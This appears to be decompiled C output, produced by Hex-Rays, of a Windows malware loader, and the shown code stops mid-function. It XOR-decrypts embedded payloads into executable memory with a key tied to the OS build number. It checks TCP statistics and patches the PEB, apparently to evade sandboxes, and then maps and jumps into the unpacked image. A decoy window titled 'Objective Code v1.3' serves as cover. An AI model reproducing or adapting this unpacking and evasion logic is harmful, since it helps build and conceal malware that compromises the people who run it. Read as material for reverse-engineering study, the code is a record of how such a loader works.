/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

LPVOID sub_410000();
int __stdcall sub_4100F0(int a1, int a2);
int sub_410120();
// BOOL __usercall sub_410420@<eax>(int *a1@<edi>, HDC a2@<esi>, int y);
BOOL __cdecl sub_410510(HWND hWnd);
// int __usercall sub_410690@<eax>(unsigned int a1@<eax>, HWND a2@<edi>);
int __stdcall sub_410790(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam); // idb
WPARAM __stdcall start(HINSTANCE hInstance, int a2, int a3, int nCmdShow);
LRESULT __stdcall sub_411070(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __usercall sub_411300@<eax>(HWND a1@<eax>);
// BOOL __usercall sub_411340@<eax>(HWND a1@<esi>);
BOOL __stdcall EnumFunc(HWND, LPARAM); // idb
// HWND __usercall sub_4113E0@<eax>(HWND a1@<eax>);
HWND __cdecl sub_4114D0(DWORD dwMessageId);
int __cdecl sub_411550(int a1);
// unsigned __int8 *__usercall sub_411600@<eax>(unsigned __int8 *a1@<eax>, int a2, LPCSTR lpString);
// BOOL __usercall sub_4116B0@<eax>(CHAR *a1@<esi>, char a2, const CHAR *a3, const CHAR *a4);
// int __usercall sub_411760@<eax>(const char *a1@<esi>, const char *a2);
// unsigned int __usercall sub_411820@<eax>(const char *a1@<ebx>, char *a2);
LRESULT __stdcall sub_4118E0(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
LRESULT __cdecl sub_411FC0(HWND hWnd);
void *__cdecl memset(void *, int Val, size_t Size);
unsigned int __cdecl sub_412090(unsigned int a1, const __m128i *a2, unsigned int a3);
int __cdecl _except_handler3_0(int, PVOID TargetFrame, int); // idb
int sub_4125DB();
void __cdecl CallDestructExceptionObject_0(_DWORD *a1, int a2);
void __cdecl __spoils<eax,ecx,edx> _global_unwind2(PVOID TargetFrame);
int __cdecl __spoils<eax,ecx,edx> _unwind_handler(int a1, int a2, int a3, _DWORD *a4, int a5);
int __cdecl __spoils<eax,ecx,edx> _local_unwind2(int a1, unsigned int a2);
// int __userpurge sub_412845@<eax>(int result@<eax>, int a2@<ebp>, int a3);
// int __usercall sub_412864@<eax>(int (*a1)(void)@<eax>);
// int __usercall ValidateScopeTableHandlers@<eax>(int a1@<ecx>, char *a2@<edi>, int a3);
int __cdecl _ValidateEH3RN(_DWORD *a1);
BOOL __cdecl _ValidateImageBase(char *pImageBase);
_IMAGE_SECTION_HEADER *__cdecl _FindPESection(char *pImageBase, unsigned int rva); // idb
BOOL __cdecl _IsNonwritableInCurrentImage(int a1);
int __cdecl _except_handler4(_EXCEPTION_RECORD *ExceptionRecord, _EXCEPTION_REGISTRATION_RECORD *EstablisherFrame, _CONTEXT *ContextRecord);
void __cdecl __noreturn __report_gsfailure_0();
// int __usercall _local_unwind4_0@<eax>(int a1@<ebp>, _DWORD *a2, int a3, unsigned int a4);
int __cdecl _unwind_handler4(int a1, _DWORD *a2, int a3, _DWORD *a4);
int __thiscall sub_413172(int (*this)(void));
int __fastcall sub_413189(int (__fastcall *a1)(_DWORD, _DWORD), int a2);
void __fastcall sub_4131A2(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord);
int __fastcall sub_4131BB(int a1, unsigned int a2, int a3, _DWORD *a4);
void sub_4131D2();
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
HFONT sub_4131E0();
// HWND __stdcall CreateToolbarEx(HWND hwnd, DWORD ws, UINT wID, int nBitmaps, HINSTANCE hBMInst, UINT_PTR wBMID, LPCTBBUTTON lpButtons, int iNumButtons, int dxButton, int dyButton, int dxBitmap, int dyBitmap, UINT uStructSize);
// BOOL __stdcall GetSaveFileNameA(LPOPENFILENAMEA);
// BOOL __stdcall GetOpenFileNameA(LPOPENFILENAMEA);
// BOOL __stdcall MoveToEx(HDC hdc, int x, int y, LPPOINT lppt);
// BOOL __stdcall LineTo(HDC hdc, int x, int y);
// HFONT __stdcall CreateFontA(int cHeight, int cWidth, int cEscapement, int cOrientation, int cWeight, DWORD bItalic, DWORD bUnderline, DWORD bStrikeOut, DWORD iCharSet, DWORD iOutPrecision, DWORD iClipPrecision, DWORD iQuality, DWORD iPitchAndFamily, LPCSTR pszFaceName);
// BOOL __stdcall DeleteObject(HGDIOBJ ho);
// HGDIOBJ __stdcall SelectObject(HDC hdc, HGDIOBJ h);
// HPEN __stdcall CreatePen(int iStyle, int cWidth, COLORREF color);
// HBRUSH __stdcall CreateSolidBrush(COLORREF color);
// HGDIOBJ __stdcall GetStockObject(int i);
// ULONG __stdcall GetTcpStatistics(PMIB_TCPSTATS Statistics);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
// DWORD __stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// void __stdcall GetStartupInfoW(LPSTARTUPINFOW lpStartupInfo);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// void __stdcall Sleep(DWORD dwMilliseconds);
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// HANDLE __stdcall GetProcessHeap();
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// int __stdcall lstrlenA(LPCSTR lpString);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall GetCurrentProcess();
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall IsDebuggerPresent();
// int __stdcall GetWindowTextLengthA(HWND hWnd);
// BOOL __stdcall GetClientRect(HWND hWnd, LPRECT lpRect);
// int __stdcall MessageBoxIndirectA(const MSGBOXPARAMSA *lpmbp);
// int wsprintfA(LPSTR, LPCSTR, ...);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// HWND __stdcall GetFocus();
// int __stdcall FillRect(HDC hDC, const RECT *lprc, HBRUSH hbr);
// BOOL __stdcall TrackPopupMenu(HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT *prcRect);
// LRESULT __stdcall SendDlgItemMessageA(HWND hDlg, int nIDDlgItem, UINT Msg, WPARAM wParam, LPARAM lParam);
// void __stdcall PostQuitMessage(int nExitCode);
// ATOM __stdcall RegisterClassExA(const WNDCLASSEXA *);
// BOOL __stdcall GetWindowRect(HWND hWnd, LPRECT lpRect);
// BOOL __stdcall ScreenToClient(HWND hWnd, LPPOINT lpPoint);
// HMENU __stdcall GetSystemMenu(HWND hWnd, BOOL bRevert);
// BOOL __stdcall DestroyAcceleratorTable(HACCEL hAccel);
// UINT __stdcall GetDlgItemInt(HWND hDlg, int nIDDlgItem, BOOL *lpTranslated, BOOL bSigned);
// BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// BOOL __stdcall DestroyWindow(HWND hWnd);
// BOOL __stdcall EndPaint(HWND hWnd, const PAINTSTRUCT *lpPaint);
// LRESULT __stdcall SendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// HDC __stdcall BeginPaint(HWND hWnd, LPPAINTSTRUCT lpPaint);
// BOOL __stdcall PtInRect(const RECT *lprc, POINT pt);
// BOOL __stdcall IsDialogMessageA(HWND hDlg, LPMSG lpMsg);
// BOOL __stdcall TranslateMessage(const MSG *lpMsg);
// BOOL __stdcall InflateRect(LPRECT lprc, int dx, int dy);
// HWND __stdcall GetForegroundWindow();
// int __stdcall GetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount);
// LONG __stdcall SetWindowLongA(HWND hWnd, int nIndex, LONG dwNewLong);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// HACCEL __stdcall CreateAcceleratorTableA(LPACCEL paccel, int cAccel);
// LONG __stdcall GetWindowLongA(HWND hWnd, int nIndex);
// HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// int __stdcall TranslateAcceleratorA(HWND hWnd, HACCEL hAccTable, LPMSG lpMsg);
// LRESULT __stdcall DefWindowProcA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall EnumChildWindows(HWND hWndParent, WNDENUMPROC lpEnumFunc, LPARAM lParam);
// BOOL __stdcall ShowWindow(HWND hWnd, int nCmdShow);
// HMENU __stdcall CreatePopupMenu();
// BOOL __stdcall MoveWindow(HWND hWnd, int X, int Y, int nWidth, int nHeight, BOOL bRepaint);
// ATOM __stdcall RegisterClassA(const WNDCLASSA *lpWndClass);
// HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName);
// BOOL __stdcall UpdateWindow(HWND hWnd);
// int __stdcall FrameRect(HDC hDC, const RECT *lprc, HBRUSH hbr);
// BOOL __stdcall AppendMenuA(HMENU hMenu, UINT uFlags, UINT_PTR uIDNewItem, LPCSTR lpNewItem);
// BOOL __stdcall PostMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// LRESULT __stdcall DispatchMessageA(const MSG *lpMsg);
// BOOL __stdcall SystemParametersInfoA(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// BOOL __stdcall SetWindowTextA(HWND hWnd, LPCSTR lpString);
// HANDLE __stdcall LoadImageA(HINSTANCE hInst, LPCSTR name, UINT type, int cx, int cy, UINT fuLoad);
// HWND __stdcall SetFocus(HWND hWnd);
// void __stdcall CoUninitialize();
// HRESULT __stdcall CoCreateInstance(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
// HRESULT __stdcall CoInitialize(LPVOID pvReserved);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_412748; // weak
_UNKNOWN loc_4131B6; // weak
const IID riid = { 136441u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
const IID rclsid = { 136193u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
_UNKNOWN unk_4201B8; // weak
_UNKNOWN unk_4203BF; // weak
int dword_4203C0 = 2764330; // weak
const struct _EXCEPTION_POINTERS ExceptionInfo = { &dword_435548, &dword_4355A0 }; // idb
CHAR asc_430000[2] = "["; // idb
int dword_430004 = 10; // weak
_UNKNOWN unk_430008; // weak
_UNKNOWN unk_4338F0; // weak
int dword_43400C = 1; // weak
char byte_434010[] = { 'M' }; // weak
int dword_434014 = 1841179; // weak
int dword_434018 = 404495364; // weak
int dword_43401C = 58343; // weak
int dword_434020 = 404233380; // weak
int dword_434024 = 469762076; // weak
_UNKNOWN unk_434028; // weak
int dword_43404C = 1841320; // weak
_UNKNOWN unk_434108; // weak
_DWORD dword_435420[4] = { 429065504, 0, 0, 0 }; // idb
uintptr_t __security_cookie = 3141592654u;
int dword_435440[] = { 0 }; // weak
int dword_435444 = 0; // weak
HBRUSH hbr = NULL; // idb
int dword_43544C[] = { 0 }; // weak
int dword_435450 = 0; // weak
LPCSTR lpFileName = NULL; // idb
int dword_435458 = 0; // weak
int dword_43545C = 0; // weak
int dword_435460 = 0; // weak
int dword_435464 = 0; // weak
int dword_435468 = 0; // weak
int x = 0; // idb
int y = 0; // idb
HINSTANCE hBMInst = NULL; // idb
int dword_43548C = 0; // weak
__int16 word_435490 = 0; // weak
int dword_435494 = 0; // weak
int dword_435498 = 0; // weak
int dword_43549C = 0; // weak
DWORD flOldProtect = 0u; // idb
int dword_4354A4 = 0; // weak
HWND dword_4354A8 = NULL; // idb
WPARAM wParam = 0u; // idb
HWND dword_4354B0 = NULL; // idb
int dword_4354B4 = 0; // weak
HWND hWnd = NULL; // idb
int dword_4354C0[] = { 0 }; // weak
int dword_4354C4[] = { 0 }; // weak
int dword_4354C8[] = { 0 }; // weak
int dword_4354CC[31] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // idb
int dword_435548 = 0; // weak
int dword_43554C = 0; // weak
int dword_435554 = 0; // weak
int dword_435598 = 0; // weak
int dword_4355A0 = 0; // weak
__int16 word_43562C; // weak
__int16 word_435630; // weak
__int16 word_435634; // weak
__int16 word_435638; // weak
int dword_43563C; // weak
int dword_435640; // weak
int dword_435644; // weak
int dword_435648; // weak
int dword_43564C; // weak
int dword_435650; // weak
int dword_435654; // weak
int dword_435658; // weak
__int16 word_43565C; // weak
int dword_435660; // weak
int dword_435664; // weak
__int16 word_435668; // weak
int dword_43586C; // weak
int (__cdecl *dword_435870)(_DWORD, _DWORD); // weak
int dword_435874; // weak


//----- (00410000) --------------------------------------------------------
LPVOID sub_410000()
{
  int v0; // ebx
  int v1; // edi
  int v2; // eax
  int v3; // esi
  unsigned int v4; // eax
  const __m128i *v5; // ecx
  unsigned int v6; // edx
  int v8; // [esp+Ch] [ebp-Ch]
  LPVOID v9; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  v0 = 0;
  dword_43544C[0] = (int)&unk_430008;
  dword_435440[0] = 14565;
  dword_435450 = (int)&unk_4338F0;
  dword_435444 = 1819;
  v9 = VirtualAlloc(0, 0x4000u, 0x3000u, 0x40u);
  v10 = 0;
  do
  {
    v1 = dword_43544C[v0];
    v2 = 0;
    v3 = 0;
    v8 = dword_435440[v0];
    if ( v8 > 0 )
    {
      do
      {
        *(_BYTE *)(v3 + v1) ^= v2 ^ dword_430004 ^ (v2 + dword_430004);
        if ( v2 <= 5 )
          ++v2;
        else
          v2 = 0;
        ++v3;
      }
      while ( v3 < v8 );
    }
    if ( v0 )
    {
      v4 = dword_435440[v0];
      v5 = (const __m128i *)dword_43544C[v0];
      v6 = (unsigned int)v9 + v10;
    }
    else
    {
      v4 = dword_435440[0];
      v5 = (const __m128i *)dword_43544C[0];
      v6 = (unsigned int)v9;
    }
    sub_412090(v6, v5, v4);
    v10 += dword_435440[v0++];
  }
  while ( v0 < 2 );
  return v9;
}
// 430004: using guessed type int dword_430004;
// 435440: using guessed type int dword_435440[];
// 435444: using guessed type int dword_435444;
// 43544C: using guessed type int dword_43544C[];
// 435450: using guessed type int dword_435450;

//----- (004100F0) --------------------------------------------------------
int __stdcall sub_4100F0(int a1, int a2)
{
  int v2; // eax

  v2 = dword_435494;
  *(_DWORD *)dword_435494 = dword_43548C;
  *(_WORD *)(v2 + 4) = word_435490;
  dword_43400C = 0;
  return 1;
}
// 43400C: using guessed type int dword_43400C;
// 43548C: using guessed type int dword_43548C;
// 435490: using guessed type __int16 word_435490;
// 435494: using guessed type int dword_435494;

//----- (00410120) --------------------------------------------------------
int sub_410120()
{
  MIB_TCPSTATS_LH *v1; // esi
  HWND v2; // esi
  HDC v3; // eax
  HBRUSH v4; // edx
  char v5; // cl
  int v6; // eax
  int i; // esi
  unsigned int v8; // edx
  int v9; // ecx
  int v10; // ebx
  unsigned __int8 *v11; // esi
  unsigned int *v12; // edi
  unsigned __int8 *v13; // eax
  int v14; // ecx
  CHAR *v15; // edi
  char v16[20]; // [esp+Ch] [ebp-388h] BYREF
  unsigned int v17; // [esp+20h] [ebp-374h] BYREF
  int v18[56]; // [esp+19Ch] [ebp-1F8h] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+27Ch] [ebp-118h] BYREF
  struct tagPAINTSTRUCT Paint; // [esp+318h] [ebp-7Ch] BYREF
  unsigned int v21; // [esp+358h] [ebp-3Ch]
  int v22; // [esp+35Ch] [ebp-38h]
  int v23; // [esp+360h] [ebp-34h]
  int v24; // [esp+364h] [ebp-30h]
  int v25; // [esp+368h] [ebp-2Ch]
  CHAR String2; // [esp+36Ch] [ebp-28h] BYREF
  int v27; // [esp+36Dh] [ebp-27h]
  int v28; // [esp+371h] [ebp-23h]
  int v29; // [esp+375h] [ebp-1Fh]
  __int16 v30; // [esp+379h] [ebp-1Bh]
  char v31; // [esp+37Bh] [ebp-19h]
  CHAR String1[3]; // [esp+37Ch] [ebp-18h] BYREF
  int v33; // [esp+37Fh] [ebp-15h]
  int v34; // [esp+383h] [ebp-11h]
  int v35; // [esp+387h] [ebp-Dh]
  char v36; // [esp+38Bh] [ebp-9h]
  unsigned __int8 *v37; // [esp+38Ch] [ebp-8h]
  int v38; // [esp+390h] [ebp-4h]

  if ( !dword_43400C )
    MessageBoxA(0, "error processing data", "info", 0);
  v38 = (int)NtCurrentPeb();
  *(_WORD *)(v38 + 172) = 9999;
  memset(&VersionInformation, 0, 0x9Cu);
  VersionInformation.dwOSVersionInfoSize = 156;
  if ( GetVersionExA(&VersionInformation) )
  {
    v38 = 1;
    v1 = (MIB_TCPSTATS_LH *)VirtualAlloc(0, 4u, 0x3000u, 0x40u);
    if ( !GetTcpStatistics(v1) && v1->dwNumConns )
      v38 = 0;
    dword_430004 = dword_430004 + VersionInformation.dwBuildNumber - 9995;
    dword_43549C = (int)sub_410000() - 9999;
    if ( !v38 )
    {
LABEL_15:
      v5 = dword_430004;
      v6 = 0;
      for ( i = 0; i < 5120; ++i )
      {
        byte_434010[i] ^= v5 ^ v6 ^ (v5 + v6);
        if ( v6 <= 5 )
          ++v6;
        else
          v6 = 0;
      }
      v8 = *(int *)((char *)&dword_434014 + dword_43404C);
      v22 = *(int *)((char *)&dword_434018 + dword_43404C);
      v9 = *(int *)((char *)&dword_43401C + dword_43404C);
      v21 = v8;
      v23 = v9;
      v24 = *(int *)((char *)&dword_434020 + dword_43404C);
      v25 = *(int *)((char *)&dword_434024 + dword_43404C);
      qmemcpy(v18, (char *)&unk_434028 + dword_43404C, sizeof(v18));
      sub_412090((unsigned int)v16, (const __m128i *)((char *)&unk_434108 + dword_43404C), 40 * HIWORD(v8));
      v10 = v18[14];
      v11 = (unsigned __int8 *)VirtualAlloc(0, v18[14], 0x3000u, 0x40u);
      sub_412090((unsigned int)v11, (const __m128i *)byte_434010, v17);
      if ( HIWORD(v21) )
      {
        v12 = &v17;
        v37 = (unsigned __int8 *)HIWORD(v21);
        do
        {
          sub_412090((unsigned int)&v11[*(v12 - 2)], (const __m128i *)&byte_434010[*v12], *(v12 - 1));
          v12 += 10;
          --v37;
        }
        while ( v37 );
      }
      strcpy(String1, "lo");
      v33 = 0;
      v34 = 0;
      v35 = 0;
      v36 = 0;
      lstrcatA(String1, "hue");
      lstrcatA(String1, "ban");
      v13 = sub_411600(&v11[v18[15]], v10 - v18[15] + 1, String1);
      v14 = dword_43549C;
      v15 = (CHAR *)v13;
      if ( v38 )
        v14 = dword_43549C + 725;
      dword_43549C = VersionInformation.dwBuildNumber + v14;
      String2 = 0;
      v27 = 0;
      v28 = 0;
      v29 = 0;
      v30 = 0;
      v31 = 0;
      wsprintfA(&String2, "%d", VersionInformation.dwBuildNumber + v14);
      lstrcpyA(v15, &String2);
      sub_411550((int)v11);
      v37 = &v11[v18[4]];
      __asm { retn }
    }
    v2 = GetForegroundWindow();
    v3 = BeginPaint(v2, &Paint);
    if ( dword_435498 == 1 )
    {
      v4 = hbr;
    }
    else
    {
      if ( dword_435498 != 2 )
      {
LABEL_14:
        EndPaint(v2, &Paint);
        goto LABEL_15;
      }
      v4 = (HBRUSH)dword_435468;
    }
    FillRect(v3, &Paint.rcPaint, v4);
    goto LABEL_14;
  }
  return 1;
}
// 430004: using guessed type int dword_430004;
// 43400C: using guessed type int dword_43400C;
// 434014: using guessed type int dword_434014;
// 434018: using guessed type int dword_434018;
// 43401C: using guessed type int dword_43401C;
// 434020: using guessed type int dword_434020;
// 434024: using guessed type int dword_434024;
// 43404C: using guessed type int dword_43404C;
// 435468: using guessed type int dword_435468;
// 435498: using guessed type int dword_435498;
// 43549C: using guessed type int dword_43549C;

//----- (00410420) --------------------------------------------------------
BOOL __usercall sub_410420@<eax>(int *a1@<edi>, HDC a2@<esi>, int y)
{
  HGDIOBJ v3; // eax
  HPEN v4; // eax
  HPEN v5; // ecx
  int v6; // ebx
  HGDIOBJ v8; // [esp+4h] [ebp-Ch]
  HPEN h; // [esp+8h] [ebp-8h]
  HPEN v10; // [esp+Ch] [ebp-4h]
  int ya; // [esp+18h] [ebp+8h]

  v3 = GetStockObject(6);
  v8 = SelectObject(a2, v3);
  h = CreatePen(0, 1, 0x808080u);
  v4 = (HPEN)GetStockObject(6);
  v5 = h;
  v10 = v4;
  if ( y )
  {
    v5 = v4;
    v10 = h;
  }
  v6 = a1[2] - 1;
  ya = a1[3] - 1;
  SelectObject(a2, v5);
  MoveToEx(a2, *a1, a1[1], 0);
  LineTo(a2, *a1, ya);
  MoveToEx(a2, *a1, a1[1], 0);
  LineTo(a2, v6, a1[1]);
  SelectObject(a2, v10);
  MoveToEx(a2, v6, ya, 0);
  LineTo(a2, *a1, ya);
  MoveToEx(a2, v6, ya, 0);
  LineTo(a2, v6, a1[1]);
  SelectObject(a2, v8);
  return DeleteObject(h);
}

//----- (00410510) --------------------------------------------------------
BOOL __cdecl sub_410510(HWND hWnd)
{
  HDC v1; // esi
  HBRUSH v2; // edi
  HBRUSH v3; // edi
  struct tagPAINTSTRUCT Paint; // [esp+10h] [ebp-ACh] BYREF
  struct tagRECT v6; // [esp+54h] [ebp-68h] BYREF
  struct tagRECT v7; // [esp+64h] [ebp-58h] BYREF
  RECT v8; // [esp+74h] [ebp-48h] BYREF
  struct tagRECT v9; // [esp+84h] [ebp-38h] BYREF
  struct tagRECT Rect; // [esp+94h] [ebp-28h] BYREF
  HBRUSH hbr; // [esp+A4h] [ebp-18h]
  struct tagRECT rc; // [esp+A8h] [ebp-14h] BYREF

  v1 = BeginPaint(hWnd, &Paint);
  hbr = CreateSolidBrush(0x804000u);
  v2 = (HBRUSH)GetStockObject(1);
  GetClientRect(hWnd, &Rect);
  rc = Rect;
  InflateRect(&rc, -10, -10);
  FillRect(v1, &Rect, v2);
  FrameRect(v1, &Rect, hbr);
  v7 = Rect;
  InflateRect(&v7, -1, -1);
  v9 = rc;
  InflateRect(&v9, 1, 1);
  v6 = v9;
  InflateRect(&v6, 1, 1);
  sub_410420(&v7.left, v1, 1);
  sub_410420(&v9.left, v1, 1);
  sub_410420(&v6.left, v1, 0);
  v8 = rc;
  v3 = CreateSolidBrush(0x8B4A10u);
  v8.bottom = v8.top + 16;
  InflateRect(&v8, -1, -1);
  FillRect(v1, &v8, v3);
  DeleteObject(v3);
  EndPaint(hWnd, &Paint);
  return DeleteObject(hbr);
}

//----- (00410690) --------------------------------------------------------
int __usercall sub_410690@<eax>(unsigned int a1@<eax>, HWND a2@<edi>)
{
  int result; // eax
  struct tagRECT Rect; // [esp+8h] [ebp-28h] BYREF
  struct tagRECT rc; // [esp+18h] [ebp-18h] BYREF
  struct tagPOINT Point; // [esp+28h] [ebp-8h] BYREF

  GetClientRect(a2, &Rect);
  rc = Rect;
  InflateRect(&rc, -10, -10);
  Point.x = (unsigned __int16)a1;
  Point.y = HIWORD(a1);
  ScreenToClient(a2, &Point);
  if ( PtInRect(&rc, Point) )
  {
    if ( Point.y >= rc.top + 16 )
      result = 1;
    else
      result = Point.x <= rc.right - 16 ? 2 : 20;
  }
  else
  {
    if ( !PtInRect(&Rect, Point) )
      goto LABEL_14;
    if ( Point.x < rc.left )
      return 10;
    if ( Point.x > rc.right )
      return 11;
    if ( Point.y < rc.top )
      return 12;
    if ( Point.y > rc.bottom )
      result = 15;
    else
LABEL_14:
      result = 0;
  }
  return result;
}

//----- (00410790) --------------------------------------------------------
int __stdcall sub_410790(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  int result; // eax

  switch ( Msg )
  {
    case 0xFu:
      sub_410510(hWnd);
      return 0;
    case 0x10u:
      PostQuitMessage(0);
      return 0;
    case 0x11u:
      DestroyWindow(hWnd);
      return 1;
    case 0x14u:
      return 1;
    case 0x16u:
      DestroyWindow(hWnd);
      ExitProcess(0);
    case 0x84u:
      return sub_410690(lParam, hWnd);
    case 0xA1u:
      if ( wParam != 20 )
        goto LABEL_11;
      PostMessageA(hWnd, 0x10u, 0, 0);
      result = 0;
      break;
    default:
LABEL_11:
      result = DefWindowProcA(hWnd, Msg, wParam, lParam);
      break;
  }
  return result;
}

//----- (00410920) --------------------------------------------------------
WPARAM __stdcall start(HINSTANCE hInstance, int a2, int a3, int nCmdShow)
{
  HANDLE v4; // eax
  HINSTANCE v5; // ebx
  HWND v6; // esi
  HANDLE v7; // eax
  HWND v8; // esi
  HWND v9; // edi
  unsigned int i; // eax
  unsigned int v11; // ecx
  HWND v12; // ebx
  HMENU v13; // esi
  HWND v14; // esi
  HMODULE v15; // eax
  BOOL (__stdcall *ShowWindow)(HWND, int); // eax
  int v17; // eax
  HACCEL v18; // eax
  struct _STARTUPINFOW StartupInfo; // [esp+Ch] [ebp-194h] BYREF
  struct tagRECT Rect; // [esp+50h] [ebp-150h] BYREF
  TBBUTTON Buttons[3]; // [esp+60h] [ebp-140h] BYREF
  struct tagMSG Msg; // [esp+9Ch] [ebp-104h] BYREF
  WNDCLASSEXA v24; // [esp+B8h] [ebp-E8h] BYREF
  MSG v25; // [esp+E8h] [ebp-B8h] BYREF
  WNDCLASSEXA v26; // [esp+104h] [ebp-9Ch] BYREF
  WNDCLASSA WndClass; // [esp+134h] [ebp-6Ch] BYREF
  MSG v28; // [esp+15Ch] [ebp-44h] BYREF
  CHAR ClassName[8]; // [esp+178h] [ebp-28h] BYREF
  LPVOID ppv; // [esp+180h] [ebp-20h] BYREF
  HANDLE v31; // [esp+184h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+188h] [ebp-18h]

  v31 = CreateMutexA(0, 1, "wooodooo");
  v4 = CreateFileW(L"user32", 0x40000000u, 3u, 0, 3u, 0, 0);
  CloseHandle(v4);
  ms_exc.registration.TryLevel = -1;
  lpFileName = 0;
  dword_435458 = 0;
  dword_43545C = 0;
  dword_435460 = 0;
  dword_435464 = 0;
  v28.hwnd = 0;
  v28.message = 0;
  v28.wParam = 0;
  v28.lParam = 0;
  v28.time = 0;
  v28.pt.x = 0;
  v28.pt.y = 0;
  memset(&v26.style, 0, 0x2Cu);
  v5 = hInstance;
  v26.hInstance = hInstance;
  v26.lpszClassName = "CS";
  v26.lpfnWndProc = sub_4118E0;
  v26.style = 8;
  v26.cbSize = 48;
  v26.hIcon = LoadIconA(0, (LPCSTR)0x7F00);
  v26.hIconSm = LoadIconA(0, (LPCSTR)0x7F00);
  v26.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  v26.lpszMenuName = 0;
  v26.cbClsExtra = 0;
  v26.cbWndExtra = 0;
  v26.hbrBackground = (HBRUSH)1;
  if ( !RegisterClassExA(&v26) )
    return 0;
  v6 = CreateWindowExA(
         0x200u,
         "CS",
         "Objective Code v1.3",
         0xA0000u,
         0x80000000,
         0x80000000,
         15,
         15,
         0,
         0,
         hInstance,
         0);
  ::ShowWindow(v6, 5);
  if ( v31 )
  {
    DestroyWindow(v6);
    GetStartupInfoW(&StartupInfo);
    v7 = CreateFileW(L"map__short.lnk", 0x80000000, 3u, 0, 3u, 0, 0);
    if ( v7 != (HANDLE)-1 )
    {
      CloseHandle(v7);
      if ( !CoInitialize(0)
